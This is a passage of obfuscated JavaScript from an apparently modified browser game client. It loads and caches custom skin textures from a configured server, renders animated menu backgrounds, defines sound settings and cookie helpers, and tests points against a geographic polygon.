            onprogress: function (_0x200967) {
              var _0x1e9fb3;
              var _0x5ce0f9;
              if (_0x200967.lengthComputable) {
                _0x1e9fb3 = _0x200967.loaded / _0x200967.total;
                _0x5ce0f9 = _0x304977.pe.re;
                _0x19a1b1.ye(_0x5ce0f9, _0x304977.ve.Mc(_0x5ce0f9).Wc(_0x1e9fb3));
              }
            }
          }
        }).fail(function () {
          _0x19a1b1.ze(Error());
        }).done(function (_0x4ad6ec) {
          if (_0x4ad6ec.revision <= _0x19a1b1.ge) {
            _0x19a1b1.Ae();
            return;
          }
          ;
          var _0x15572f = {};
          var _0x1b5e69 = {
            country: "iq",
            v: "v2"
          };
          if (_0x251a97 && _0x251a97 != "iq") {
            _0x1b5e69.country = _0x251a97;
          }
          _0x15572f = _0x4ad6ec;
          if (_0x1b3b43 && _0x1c421d && _0x1c421d == _0x207b06.v_z) {
            _0x15572f = JSON.parse(_0x1b3b43);
            (async function () {
              if (_0x2f2e61 || _0x3ca2a7 || Array.isArray(_0x207b06.dg) && _0x207b06.dg.length > 0) {
                _0x15572f = await Ysw(_0x15572f);
              }
              for (let _0x47df22 in _0x15572f) {
                if (Array.isArray(_0x15572f[_0x47df22])) {
                  _0x4ad6ec[_0x47df22] = _0x4ad6ec[_0x47df22].concat(_0x15572f[_0x47df22]);
                } else {
                  _0x4ad6ec[_0x47df22] = {
                    ..._0x4ad6ec[_0x47df22],
                    ..._0x15572f[_0x47df22]
                  };
                }
              }
              ;
              _0x19a1b1.Ce(_0x4ad6ec);
            })();
          } else {
            fetch(_0x207b06.s_l + "/store", {
              headers: {
                "Content-Type": "application/json"
              },
              method: "POST",
              body: JSON.stringify(_0x1b5e69)
            }).then(async function (_0x5c1012) {
              for (let _0x1fc342 in (_0x5c1012 = await _0x5c1012.json()).textureDict) {
                for (let _0x1464fe in _0x5c1012.textureDict[_0x1fc342]) {
                  if (_0x1464fe === "file") {
                    _0x5c1012.textureDict[_0x1fc342][_0x1464fe] = "data:image/png;base64," + _0x5c1012.textureDict[_0x1fc342][_0x1464fe].substr(_0x5c1012.textureDict[_0x1fc342][_0x1464fe].length - _0x207b06.c_v, _0x207b06.c_v) + _0x5c1012.textureDict[_0x1fc342][_0x1464fe].substr(0, _0x5c1012.textureDict[_0x1fc342][_0x1464fe].length - _0x207b06.c_v);
                  }
                }
              }
              ;
              localStorage.setItem("wupsw", JSON.stringify(_0x5c1012));
              localStorage.setItem("wupit", _0x207b06.v_z);
              if (_0x2f2e61 || _0x3ca2a7 || Array.isArray(_0x207b06.dg) && _0x207b06.dg.length > 0) {
                _0x5c1012 = await Ysw(_0x5c1012);
              }
              for (let _0x1f1ada in _0x5c1012) {
                if (Array.isArray(_0x5c1012[_0x1f1ada])) {
                  _0x4ad6ec[_0x1f1ada] = _0x4ad6ec[_0x1f1ada].concat(_0x5c1012[_0x1f1ada]);
                } else {
                  _0x4ad6ec[_0x1f1ada] = {
                    ..._0x4ad6ec[_0x1f1ada],
                    ..._0x5c1012[_0x1f1ada]
                  };
                }
              }
              ;
              _0x19a1b1.Ce(_0x4ad6ec);
            }).catch(function (_0x2b90b7) {
              localStorage.removeItem("custom_wear");
              localStorage.removeItem("custom_skin");
              _0x19a1b1.Ce(_0x4ad6ec);
            });
          }
        });
      };
      _0x304977.prototype.Ce = function (_0x3a1990) {
        var _0x2958c2 = this;
        if (this.me) {
          this.we();
          return;
        }
        ;
        var _0x332cb4 = [];
        var _0x599973 = [];
        var _0x37e8a1 = 0;
        for (var _0x126d7b in _0x3a1990.textureDict) {
          if (_0x3a1990.textureDict.hasOwnProperty(_0x126d7b)) {
            var _0x5bf7a2 = _0x3a1990.textureDict[_0x126d7b];
            if (_0x5bf7a2.custom) {
              var _0x265ff3 = "";
              if (_0x5bf7a2.relativePath) {
                _0x265ff3 = _0x5bf7a2.relativePath.search("https://lh3.googleusercontent.com") != -1 ? _0x5bf7a2.relativePath : _0x207b06.s_l + _0x5bf7a2.relativePath;
              }
              var _0x481fbc = _0x5bf7a2.file || _0x265ff3;
              var _0xbb410a = 0;
              var _0x3146b5 = "";
              var _0x527f66 = new _0x304977.De(_0x126d7b, _0x481fbc, _0xbb410a, _0x3146b5);
              _0x332cb4.push(_0x527f66);
              _0x599973.push(_0x527f66);
            } else {
              var _0x481fbc = _0x494ea6.H.K + _0x5bf7a2.relativePath;
              var _0xbb410a = _0x5bf7a2.fileSize;
              var _0x3146b5 = _0x5bf7a2.sha256;
              var _0x527f66 = new _0x304977.De(_0x126d7b, _0x481fbc, _0xbb410a, _0x3146b5);
              _0x332cb4.push(_0x527f66);
              _0x599973.push(_0x527f66);
              _0x37e8a1 += _0xbb410a;
            }
          }
        }
        ;
        var _0x6727bf;
        var _0x40ad17 = 0;
        function _0x150691(_0x42b965) {
          for (var _0x2fe365 = 0; _0x2fe365 < _0x599973.length; _0x2fe365++) {
            try {
              _0x7f096e.c.URL.revokeObjectURL(_0x599973[_0x2fe365].Ee);
            } catch (_0xcf92ff) {}
          }
          ;
          _0x2958c2.ze(_0x42b965);
        }
        function _0x43dfa2(_0x5dc1a2) {
          var _0x1dc5cc;
          var _0x368c05;
          _0x1dc5cc = (_0x40ad17 + _0x331039._(_0x6727bf.Fe * _0x5dc1a2)) / _0x37e8a1;
          _0x368c05 = _0x304977.pe.se;
          _0x2958c2.ye(_0x368c05, _0x304977.ve.Mc(_0x368c05).Wc(_0x1dc5cc));
        }
        function _0xea8b9b(_0x3aa5f9) {
          var _0x113761 = new Blob([_0x3aa5f9]);
          _0x6727bf.Ee = _0x7f096e.c.URL.createObjectURL(_0x113761);
          _0x40ad17 += _0x6727bf.Fe;
          _0x216d5e();
        }
        function _0x216d5e() {
          if (_0x1b95d9 < _0x599973.length) {
            _0x6727bf = _0x599973[_0x1b95d9++];
            _0x2958c2.Ge(_0x6727bf, _0x150691, _0xea8b9b, _0x43dfa2);
            return;
          }
          ;
          _0x331039.Y(function () {
            return _0x2958c2.He(_0x3a1990, _0x332cb4);
          }, 0);
        }
        var _0x1b95d9 = 0;
        _0x216d5e();
      };
      _0x304977.prototype.Ge = function (_0x8c7227, _0x1d02eb, _0x1e7e37, _0xfa73e3) {
        $.ajax({
          type: "GET",
          url: _0x8c7227.Ie,
          xhrFields: {
            responseType: "arraybuffer",
            onprogress: function (_0x19564d) {
              if (_0x19564d.lengthComputable) {
                _0xfa73e3(_0x19564d.loaded / _0x19564d.total);
              }
            }
          }
        }).fail(function () {
          _0x1d02eb(Error());
        }).done(function (_0x45dce6) {
          _0x1e7e37(_0x45dce6);
        });
      };
      _0x304977.prototype.He = function (_0xbec00c, _0x53ae0c) {
        var _0x40855a = this;
        if (this.me) {
          this.we();
          return;
        }
        ;
        var _0x3857d0;
        var _0x3fb269;
        var _0x1515bc = {};
        function _0x107ac0() {
          for (var _0x2f2a9b = 0; _0x2f2a9b < _0x53ae0c.length; _0x2f2a9b++) {
            try {
              _0x7f096e.c.URL.revokeObjectURL(_0x53ae0c[_0x2f2a9b].Ee);
            } catch (_0x44e8d5) {}
          }
          ;
          _0x40855a.ze(Error());
        }
        function _0x512c0c() {
          var _0x293bcf;
          var _0x3b5a08;
          _0x293bcf = _0x3d1897 / _0x53ae0c.length;
          _0x3b5a08 = _0x304977.pe.te;
          _0x40855a.ye(_0x3b5a08, _0x304977.ve.Mc(_0x3b5a08).Wc(_0x293bcf));
          _0x1515bc[_0x3857d0.Je] = new _0x7f096e.Ke(_0x3857d0.Ee, _0x3fb269);
          _0xac44da();
        }
        function _0xac44da() {
          if (_0x3d1897 < _0x53ae0c.length) {
            _0x3857d0 = _0x53ae0c[_0x3d1897++];
            (_0x3fb269 = _0x4ead11.k.m.from(_0x3857d0.Ee)).on("error", _0x107ac0);
            _0x3fb269.on("loaded", _0x512c0c);
            return;
          }
          ;
          _0x331039.Y(function () {
            return _0x40855a.Le(_0xbec00c, _0x1515bc);
          }, 0);
        }
        var _0x3d1897 = 0;
        _0xac44da();
      };
      _0x304977.prototype.Le = function (_0x5e603c, _0x175bf9) {
        var _0x3bfe37 = this;
        var _0x4f2cdf = {};
        var _0x25cea5 = 0;
        var _0x4d295a = Object.values(_0x5e603c.regionDict).length;
        _0x331039.Da(_0x5e603c.regionDict, function (_0x80dd4c, _0x1d0f99) {
          var _0x2137a5;
          var _0x59ffbc;
          var _0x66e68f = _0x7f096e.Wa.mb(_0x1d0f99.texture + ": " + _0x80dd4c, _0x175bf9[_0x1d0f99.texture].Za, _0x1d0f99);
          _0x4f2cdf[_0x80dd4c] = _0x66e68f;
          if (++_0x25cea5 % 10 == 0) {
            _0x2137a5 = _0x25cea5 / _0x4d295a;
            _0x59ffbc = _0x304977.pe.ue;
            _0x3bfe37.ye(_0x59ffbc, _0x304977.ve.Mc(_0x59ffbc).Wc(_0x2137a5));
          }
        });
        var _0x334bfe = Object.values(_0x175bf9).map(function (_0x4e7641) {
          return _0x4e7641.Za;
        });
        var _0x57b86e = Object.values(_0x4f2cdf);
        var _0x2363f9 = new _0x7f096e.jc(_0x5e603c, _0x7f096e.pb.Qb(_0x5e603c, _0x4f2cdf, _0x334bfe, _0x57b86e));
        _0x331039.Y(function () {
          return _0x3bfe37.Me(_0x2363f9);
        }, 0);
      };
      _0x304977.De = function _0x20d17d(_0x367e2e, _0x546ad2, _0x500a8d, _0x54d191) {
        this.Je = _0x367e2e;
        this.Ie = _0x546ad2;
        this.Fe = _0x500a8d;
        this.Ne = _0x54d191;
        this.Ee = "";
      };
      _0x304977.prototype.Me = function (_0x3f8bcd) {
        if (this.oe) {
          _0x3f8bcd.Cc().ob();
          return;
        }
        ;
        this.oe = true;
        var _0x4248c5 = this;
        _0x331039.Y(function () {
          return _0x4248c5.he(_0x3f8bcd);
        }, 0);
      };
      _0x304977.prototype.Ae = function () {
        if (!this.oe) {
          this.oe = true;
          var _0x65c68f = this;
          _0x331039.Y(function () {
            return _0x65c68f.ie();
          }, 0);
        }
      };
      _0x304977.prototype.ze = function (_0x1fcce6) {
        if (!this.oe) {
          this.oe = true;
          var _0x9f4fe4 = this;
          _0x331039.Y(function () {
            return _0x9f4fe4.je(_0x1fcce6);
          }, 0);
        }
      };
      _0x304977.prototype.we = function () {
        if (!this.oe) {
          this.oe = true;
          var _0x35feff = this;
          _0x331039.Y(function () {
            return _0x35feff.ke();
          }, 0);
        }
      };
      _0x304977.prototype.ye = function (_0x2b8a98, _0x39a704) {
        if (!this.oe && !this.me) {
          var _0x19f244 = this;
          _0x331039.Y(function () {
            return _0x19f244.le(_0x2b8a98, _0x39a704);
          }, 0);
        }
      };
      return _0x304977;
    }();
    _0x7f096e.Oe = {};
    _0x7f096e.Pe = function () {
      function _0x1c865a() {
        this.Qe = _0x7f096e.Pe.Se.Re;
        this.Te = false;
        this.Ue = false;
        this.Ve = null;
        this.We = null;
      }
      _0x1c865a.prototype.Sa = function () {};
      _0x1c865a.prototype.Xe = function (_0xe24bf9) {
        this.Ue = _0xe24bf9;
      };
      _0x1c865a.prototype.Ye = function (_0xeb6b8b) {
        this.Qe = _0xeb6b8b;
        this.Ze();
      };
      _0x1c865a.prototype.$e = function (_0x374865) {
        this.Te = _0x374865;
        this.Ze();
      };
      _0x1c865a.prototype.Ze = function () {};
      _0x1c865a.prototype._e = function (_0x3905d, _0x56e42c) {
        if (!ooo.ud.Fc()) {
          return null;
        }
        ;
        var _0x5b1c84 = _0x3905d[_0x56e42c];
        if (_0x5b1c84 == null || _0x5b1c84.length === 0) {
          return null;
        } else {
          return _0x5b1c84[_0x331039._(_0x331039.ma() * _0x5b1c84.length)].cloneNode();
        }
      };
      _0x1c865a.prototype.af = function (_0x2faf08, _0x3eb14c, _0x4d6384) {
        if (this.Ue && !(_0x4d6384 <= 0)) {
          var _0x20cb5d = this._e(_0x2faf08, _0x3eb14c);
          if (_0x20cb5d != null) {
            _0x20cb5d.volume = _0x331039.ha(1, _0x4d6384);
            _0x20cb5d.play();
          }
        }
      };
      _0x1c865a.prototype.bf = function (_0x115bdb, _0x444b7f) {
        if (this.Qe.cf) {
          this.af(_0x115bdb.ef.df, _0x115bdb, _0x444b7f);
        }
      };
      _0x1c865a.prototype.ff = function (_0x3b1afc, _0x2a3ba5) {
        if (this.Qe.gf) {
          this.af(_0x3b1afc.ef.hf, _0x3b1afc, _0x2a3ba5);
        }
      };
      _0x1c865a.prototype.if = function () {};
      _0x1c865a.prototype.jf = function () {};
      _0x1c865a.prototype.kf = function () {};
      _0x1c865a.prototype.lf = function () {};
      _0x1c865a.prototype.mf = function () {};
      _0x1c865a.prototype.nf = function () {};
      _0x1c865a.prototype.pf = function (_0x551398, _0x52469d, _0x3966b8) {};
      _0x1c865a.prototype.qf = function (_0x2ba104) {};
      _0x1c865a.prototype.rf = function (_0x42faf1) {};
      _0x1c865a.prototype.sf = function (_0x30bcd0) {};
      _0x1c865a.prototype.tf = function (_0xe784af) {};
      _0x1c865a.prototype.uf = function (_0x44afde) {};
      _0x1c865a.prototype.vf = function (_0x47b46f) {};
      _0x1c865a.prototype.wf = function (_0x1b7ff0) {};
      _0x1c865a.prototype.xf = function (_0x574385) {};
      _0x1c865a.prototype.yf = function (_0x3d3f50) {};
      _0x1c865a.prototype.zf = function (_0x402ae0) {};
      _0x1c865a.prototype.Af = function (_0x5cfd5d) {};
      _0x1c865a.prototype.Bf = function (_0x353d65) {};
      _0x1c865a.prototype.Cf = function (_0x17ddac) {};
      _0x1c865a.prototype.Df = function (_0x2100ca) {};
      _0x1c865a.prototype.Ef = function (_0x2c16b6, _0x4a4709) {};
      _0x1c865a.prototype.Ff = function (_0x1690d4) {};
      _0x1c865a.prototype.Gf = function (_0x3fe578, _0xa5fec, _0x37a1eb) {};
      _0x1c865a.Se = {
        Re: {
          Hf: false,
          If: false,
          gf: true,
          cf: false
        },
        Jf: {
          Hf: false,
          If: true,
          gf: true,
          cf: false
        },
        Kf: {
          Hf: true,
          If: false,
          gf: false,
          cf: true
        },
        Lf: {
          Hf: false,
          If: false,
          gf: true,
          cf: false
        },
        Mf: {
          Hf: false,
          If: false,
          gf: false,
          cf: false
        }
      };
      return _0x1c865a;
    }();
    _0x7f096e.Nf = function () {
      function _0x394b74(_0x32d104) {
        this.Of = _0x32d104;
        this.nc = _0x32d104.get()[0];
        this.Pf = 1;
        this.Qf = 1;
        this.Rf = new _0x7f096e.Sf(_0x4143c7, _0x591cce, _0x7f096e.Uf.Tf);
        this.Vf = ((_0x563fc5 = {}).view = this.nc, _0x563fc5.backgroundColor = _0x581506, _0x563fc5.antialias = true, new _0x4ead11.k.o(_0x563fc5));
        this.Wf = new _0x4ead11.k.l();
        this.Wf.sortableChildren = true;
        this.Xf = new _0x4ead11.k.l();
        this.Xf.zIndex = 0;
        this.Wf.addChild(this.Xf);
        this.Yf = new _0x7f096e.Zf(ooo.ef.$f);
        this.Yf._f.zIndex = 1;
        this.Wf.addChild(this.Yf._f);
        var _0x563fc5;
        var _0x1024ae = this.Rf.ag();
        _0x1024ae.zIndex = 2;
        this.Wf.addChild(_0x1024ae);
        this.bg = new _0x4ead11.k.l();
        this.bg.zIndex = 3;
        this.Wf.addChild(this.bg);
        this.cg = [];
        this.dg = [];
        this.eg = [];
        this.Sa();
      }
      var _0x581506 = 0;
      var _0x4143c7 = 5;
      var _0x591cce = 40;
      var _0x6fb65f = [{
        fg: 1,
        gg: 0.5,
        hg: 0.5
      }, {
        fg: 1,
        gg: 0.75,
        hg: 0.5
      }, {
        fg: 1,
        gg: 1,
        hg: 0.5
      }, {
        fg: 0.75,
        gg: 1,
        hg: 0.5
      }, {
        fg: 0.5,
        gg: 1,
        hg: 0.5
      }, {
        fg: 0.5,
        gg: 1,
        hg: 0.75
      }, {
        fg: 0.5,
        gg: 1,
        hg: 1
      }, {
        fg: 0.5,
        gg: 0.75,
        hg: 1
      }, {
        fg: 0.5,
        gg: 0.5,
        hg: 1
      }, {
        fg: 0.75,
        gg: 0.5,
        hg: 1
      }, {
        fg: 1,
        gg: 0.5,
        hg: 1
      }, {
        fg: 1,
        gg: 0.5,
        hg: 0.75
      }];
      _0x394b74.prototype.Sa = function () {
        this.Vf.backgroundColor = _0x581506;
        this.cg = Array(_0x6fb65f.length);
        for (var _0x1e7452 = 0; _0x1e7452 < this.cg.length; _0x1e7452++) {
          this.cg[_0x1e7452] = new _0x4ead11.k.s();
          this.cg[_0x1e7452].texture = ooo.ef.ig;
          this.cg[_0x1e7452].anchor.set(0.5);
          this.Xf.addChild(this.cg[_0x1e7452]);
        }
        ;
        this.dg = Array(ooo.ef.jg.length);
        for (var _0x23f6ad = 0; _0x23f6ad < this.dg.length; _0x23f6ad++) {
          this.dg[_0x23f6ad] = new _0x4ead11.k.s();
          this.dg[_0x23f6ad].texture = ooo.ef.jg[_0x23f6ad];
          this.dg[_0x23f6ad].anchor.set(0.5);
          this.bg.addChild(this.dg[_0x23f6ad]);
        }
        ;
        this.eg = Array(this.dg.length);
        for (var _0x3491bc = 0; _0x3491bc < this.eg.length; _0x3491bc++) {
          var _0x43f258 = [1, 1, 1];
          this.eg[_0x3491bc] = {
            kg: _0x331039.va(0, _0x494ea6.S),
            lg: _0x331039.va(0.09, 0.16) * 0.66,
            mg: _0x331039.va(0, 1),
            ng: _0x331039.va(0, 1),
            og: 0,
            fg: _0x43f258[0],
            gg: _0x43f258[1],
            hg: _0x43f258[2]
          };
        }
        ;
        this.pg();
        this.qg();
      };
      _0x394b74.Rd = false;
      _0x394b74.rg = function (_0x558cc9) {
        _0x394b74.Rd = _0x558cc9;
      };
      _0x394b74.prototype.sg = function (_0x239623) {
        this.Rf.rg(_0x239623);
      };
      _0x394b74.prototype.qg = function () {
        var _0x9868b0 = _0x331039.e();
        this.Pf = this.Of.width();
        this.Qf = this.Of.height();
        this.Vf.resize(this.Pf, this.Qf);
        this.Vf.resolution = _0x9868b0;
        this.nc.width = _0x9868b0 * this.Pf;
        this.nc.height = _0x9868b0 * this.Qf;
        var _0x1d25f6 = _0x331039.ia(this.Pf, this.Qf) * 0.6;
        for (var _0x5f1be4 = 0; _0x5f1be4 < this.cg.length; _0x5f1be4++) {
          this.cg[_0x5f1be4].width = _0x1d25f6;
          this.cg[_0x5f1be4].height = _0x1d25f6;
        }
        ;
        this.Yf.tg(this.Pf, this.Qf);
        this.Rf.qg();
      };
      _0x394b74.prototype.ug = function (_0x249c04, _0x14ac8d) {
        if (_0x394b74.Rd) {
          var _0x2f4fa3 = _0x249c04 / 1000;
          var _0x535b97 = this.Of.width();
          var _0x1fb527 = this.Of.height();
          for (var _0x32528a = 0; _0x32528a < this.cg.length; _0x32528a++) {
            var _0x3fa442 = _0x6fb65f[_0x32528a % _0x6fb65f.length];
            var _0x2c2034 = this.cg[_0x32528a];
            var _0x58574c = _0x32528a / this.cg.length * _0x494ea6.T;
            var _0x5697bd = _0x2f4fa3 * 0.5 * 0.12;
            var _0x2365f4 = _0x331039.pa((_0x5697bd + _0x58574c) * 3) * _0x331039.pa(_0x58574c) - _0x331039.oa((_0x5697bd + _0x58574c) * 5) * _0x331039.oa(_0x58574c);
            var _0x2a585a = _0x331039.pa((_0x5697bd + _0x58574c) * 3) * _0x331039.oa(_0x58574c) + _0x331039.oa((_0x5697bd + _0x58574c) * 5) * _0x331039.pa(_0x58574c);
            var _0x552406 = 0.2 + _0x331039.pa(_0x58574c + _0x2f4fa3 * 0.075) * 0.2;
            var _0x2c207d = _0x3fa442.fg * 255 << 16 & 16711680 | _0x3fa442.gg * 255 << 8 & 65280 | _0x3fa442.hg * 255 & 255;
            _0x2c2034.tint = _0x2c207d;
            _0x2c2034.alpha = _0x552406;
            _0x2c2034.position.set(_0x535b97 * (0.2 + (_0x2365f4 + 1) * 0.5 * 0.6), _0x1fb527 * (0.1 + (_0x2a585a + 1) * 0.5 * 0.8));
          }
          ;
          var _0x2f3739 = _0x331039.ia(_0x535b97, _0x1fb527) * 0.05;
          for (var _0x47e7b6 = 0; _0x47e7b6 < this.dg.length; _0x47e7b6++) {
            var _0x259ad1 = this.eg[_0x47e7b6];
            var _0xb0b610 = this.dg[_0x47e7b6];
            var _0x17fc8d = _0x494ea6.S * _0x47e7b6 / this.dg.length;
            _0x259ad1.mg = 0.2 + (_0x331039.pa(_0x2f4fa3 * 0.01 + _0x17fc8d) + _0x331039.pa(_0x2f4fa3 * 0.02 * 17 + _0x17fc8d) * 0.2 + 1) * 0.6 / 2;
            _0x259ad1.ng = 0.1 + (_0x331039.oa(_0x2f4fa3 * 0.01 + _0x17fc8d) + _0x331039.oa(_0x2f4fa3 * 0.02 * 21 + _0x17fc8d) * 0.2 + 1) * 0.8 / 2;
            var _0xd9620d = _0x259ad1.mg;
            var _0x4c44e0 = _0x259ad1.ng;
            var _0x53608c = _0x331039.fa(_0x331039.ra(_0x331039.pa((_0x17fc8d + _0x2f4fa3 * 0.048) * 1.5), 6), 0, 0.9);
            var _0x4b976f = (0.4 + (1 + _0x331039.oa(_0x17fc8d + _0x2f4fa3 * 0.12)) * 0.5 * 1.2) * 1.2;
            var _0x13cbf3 = _0x17fc8d + _0x2f4fa3 * 0.1;
            var _0x5561e9 = _0x259ad1.fg * 255 << 16 & 16711680 | _0x259ad1.gg * 255 << 8 & 65280 | _0x259ad1.hg * 255 & 255;
            _0xb0b610.alpha = _0x53608c;
            _0xb0b610.tint = _0x5561e9;
            _0xb0b610.position.set(_0x535b97 * _0xd9620d, _0x1fb527 * _0x4c44e0);
            _0xb0b610.rotation = _0x13cbf3;
            var _0x25c3c4 = _0xb0b610.texture.width / _0xb0b610.texture.height;
            _0xb0b610.width = _0x4b976f * _0x2f3739;
            _0xb0b610.height = _0x4b976f * _0x2f3739 * _0x25c3c4;
          }
          ;
          this.vg();
          this.Vf.render(this.Wf, null, true);
        }
      };
      _0x394b74.prototype.wg = function () {
        if (ooo.ud.Fc()) {
          var _0x20554d = ooo.ud.Cc().Rb(_0x4143c7);
          for (var _0x25594e = 0; _0x25594e < _0x4143c7; _0x25594e++) {
            this.Rf.xg(_0x25594e, _0x20554d[_0x25594e]);
          }
        } else {
          var _0x58fa3a = _0x331039.va(0, 1);
          for (var _0x3555a4 = 0; _0x3555a4 < _0x4143c7; _0x3555a4++) {
            var _0xda76aa = (_0x58fa3a + _0x3555a4 / _0x4143c7) % 1;
            var _0x1e0bc2 = _0x331039.za(_0x331039._(_0xda76aa * 360), 0.85, 0.5);
            var _0x25b4dd = _0x1e0bc2[0] * 255 & 255 | _0x1e0bc2[1] * 255 << 8 & 65280 | _0x1e0bc2[2] * 255 << 16 & 16711680;
            var _0x9ad365 = "000000" + _0x25b4dd.toString(16);
            _0x9ad365 = "#" + _0x9ad365.substring(_0x9ad365.length - 6, _0x9ad365.length);
            this.Rf.yg(_0x3555a4, _0x9ad365);
          }
        }
      };
      _0x394b74.prototype.pg = function () {
        var _0x1ab808 = _0x331039.ha(this.Pf, this.Qf);
        var _0x393e30 = _0x331039.Ca();
        for (var _0x2fe682 = 0; _0x2fe682 < _0x4143c7; _0x2fe682++) {
          var _0x493a21 = _0x40692c(_0x393e30, 0.12, _0x2fe682 / _0x4143c7 * _0x494ea6.S);
          _0x493a21._a = _0x493a21._a * 4;
          _0x493a21.ab = _0x493a21.ab * 4;
          this.Rf.zg(_0x2fe682, (this.Pf + _0x493a21._a * _0x1ab808) * 0.5, (this.Qf + _0x493a21.ab * _0x1ab808) * 0.5);
        }
      };
      _0x394b74.prototype.vg = function () {
        var _0x30623c = _0x331039.ha(this.Pf, this.Qf);
        var _0x641010 = _0x331039.Ca();
        for (var _0x5994c3 = 0; _0x5994c3 < _0x4143c7; _0x5994c3++) {
          var _0x17027d = _0x40692c(_0x641010, 0.12, _0x5994c3 / _0x4143c7 * _0x494ea6.S);
          this.Rf.Ag(_0x5994c3, (this.Pf + _0x17027d._a * _0x30623c) * 0.5, (this.Qf + _0x17027d.ab * _0x30623c) * 0.5);
        }
        ;
        this.Rf.Bg();
      };
      function _0x40692c(_0x5c2b0d, _0x5d1098, _0xd19120) {
        var _0x2df63b = _0x5c2b0d / 1000;
        return {
          _a: (_0x331039.pa(_0x5d1098 * _0x2df63b + _0xd19120) + _0x331039.pa(_0x5d1098 * -32 * _0x2df63b + _0xd19120) * 0.4 + _0x331039.pa(_0x5d1098 * 7 * _0x2df63b + _0xd19120) * 0.7) * 0.8,
          ab: (_0x331039.oa(_0x5d1098 * _0x2df63b + _0xd19120) + _0x331039.oa(_0x5d1098 * -32 * _0x2df63b + _0xd19120) * 0.4 + _0x331039.oa(_0x5d1098 * 7 * _0x2df63b + _0xd19120) * 0.7) * 0.8
        };
      }
      return _0x394b74;
    }();
    _0x7f096e.Cg = function () {
      function _0x3af822() {}
      _0x3af822.Dg = "consent_state_2";
      _0x3af822.Eg = "showPlayerNames";
      _0x3af822.Fg = "musicEnabled";
      _0x3af822.Gg = "sfxEnabled";
      _0x3af822.Hg = "account_type";
      _0x3af822.Ig = "gameMode";
      _0x3af822.Jg = "nickname";
      _0x3af822.Kg = "skin";
      _0x3af822.Lg = "prerollCount";
      _0x3af822.Mg = "shared";
      _0x3af822.Ng = function (_0x51f8ce, _0x362a99, _0x399490) {
        var _0xad16 = new Date();
        _0xad16.setTime(_0xad16.getTime() + _0x399490 * 86400000);
        var _0x224e6b = "expires=" + _0xad16.toUTCString();
        _0x7f096e.d.cookie = _0x51f8ce + "=" + _0x362a99 + "; " + _0x224e6b;
      };
      _0x3af822.Og = function (_0xd630f4) {
        var _0x154a7a = _0xd630f4 + "=";
        for (var _0x33fd57 = _0x7f096e.d.cookie.split("; "), _0x1ea872 = 0; _0x1ea872 < _0x33fd57.length; _0x1ea872++) {
          for (var _0x3416ea = _0x33fd57[_0x1ea872]; _0x3416ea.charAt(0) == " ";) {
            _0x3416ea = _0x3416ea.substring(1);
          }
          ;
          if (_0x3416ea.indexOf(_0x154a7a) == 0) {
            return _0x3416ea.substring(_0x154a7a.length, _0x3416ea.length);
          }
        }
        ;
        return "";
      };
      return _0x3af822;
    }();
    _0x46e41a = [[-28.06744, 64.95936], [-10.59082, 72.91964], [14.11773, 81.39558], [36.51855, 81.51827], [32.82715, 71.01696], [31.64063, 69.41897], [29.41419, 68.43628], [30.64379, 67.47302], [29.88281, 66.76592], [30.73975, 65.50385], [30.73975, 64.47279], [31.48682, 63.49957], [32.18994, 62.83509], [28.47726, 60.25122], [28.76221, 59.26588], [28.03711, 58.60833], [28.38867, 57.53942], [28.83955, 56.2377], [31.24512, 55.87531], [31.61865, 55.34164], [31.92627, 54.3037], [33.50497, 53.26758], [32.73926, 52.85586], [32.23389, 52.4694], [34.05762, 52.44262], [34.98047, 51.79503], [35.99121, 50.88917], [36.67236, 50.38751], [37.74902, 50.51343], [40.78125, 49.62495], [40.47363, 47.70976], [38.62799, 46.92028], [37.53193, 46.55915], [36.72182, 44.46428], [39.68218, 43.19733], [40.1521, 43.74422], [43.52783, 43.03678], [45.30762, 42.73087], [46.99951, 41.98399], [47.26318, 40.73061], [44.20009, 40.86309], [45.35156, 39.57182], [45.43945, 36.73888], [35.64789, 35.26481], [33.13477, 33.65121], [21.47977, 33.92486], [12.16268, 34.32477], [11.82301, 37.34239], [6.09112, 38.28597], [-1.96037, 35.62069], [-4.82156, 35.60443], [-7.6498, 35.26589], [-16.45237, 37.44851], [-28.06744, 64.95936]];
    _0x494ea6.Pg = {
      Qg: function (_0xc85390, _0x48407f) {
        return function _0x45f757(_0x1fd7fb, _0x1e4f92, _0x30ecdc) {
          var _0x5ab8c0 = false;
          for (var _0x4ff209 = _0x30ecdc.length, _0x3543de = 0, _0x476474 = _0x4ff209 - 1; _0x3543de < _0x4ff209; _0x476474 = _0x3543de++) {
            if (_0x30ecdc[_0x3543de][1] > _0x1e4f92 != _0x30ecdc[_0x476474][1] > _0x1e4f92 && _0x1fd7fb < (_0x30ecdc[_0x476474][0] - _0x30ecdc[_0x3543de][0]) * (_0x1e4f92 - _0x30ecdc[_0x3543de][1]) / (_0x30ecdc[_0x476474][1] - _0x30ecdc[_0x3543de][1]) + _0x30ecdc[_0x3543de][0]) {
              _0x5ab8c0 = !_0x5ab8c0;
            }
          }
          ;
          return _0x5ab8c0;
        }(_0x48407f, _0xc85390, _0x46e41a);
      }
    };
    _0x7f096e.Rg = function () {
      function _0x48a691(_0x21f02b, _0x4dd8a5) {
        var _0x46483c;
        var _0x54c49c;
        if (_0x4dd8a5) {
          _0x46483c = 1.3;
          _0x54c49c = 15554111;
        } else {
          _0x46483c = 1.1;
          _0x54c49c = 16044288;
        }
        return new _0x43db08(_0x21f02b, _0x54c49c, true, 0.5, _0x46483c, 0.5, 0.7);
      }
      function _0x2df280(_0x2d756f, _0x2b05cc, _0x425777) {
        return ((_0x2d756f * 255 & 255) << 16) + ((_0x2b05cc * 255 & 255) << 8) + (_0x425777 * 255 & 255);
      }
      var _0x4f0900 = _0x331039.ca(_0x4ead11.k.l, function () {
        _0x4ead11.k.l.call(this);
        this.Sg = [];
        this.Tg = 0;
      });
      _0x4f0900.prototype.Ug = function (_0x2abfd1) {
        this.Tg += _0x2abfd1;
        if (this.Tg >= 1) {
          var _0x325627 = _0x331039._(this.Tg);
          this.Tg -= _0x325627;
          var _0x1dd156 = function _0x5c20a8(_0x229f49) {
            _0x31739d = _0x229f49 > 0 ? "+" + _0x331039._(_0x229f49) : _0x229f49 < 0 ? "-" + _0x331039._(_0x229f49) : "0";
            var _0x31739d;
            var _0x11d42a;
            var _0x2dcd66 = _0x331039.ha(1.5, 0.5 + _0x229f49 / 600);
            if (_0x229f49 < 1) {
              _0x11d42a = "0xFFFFFF";
            } else if (_0x229f49 < 30) {
              var _0x9cb6e3 = (_0x229f49 - 1) / 29;
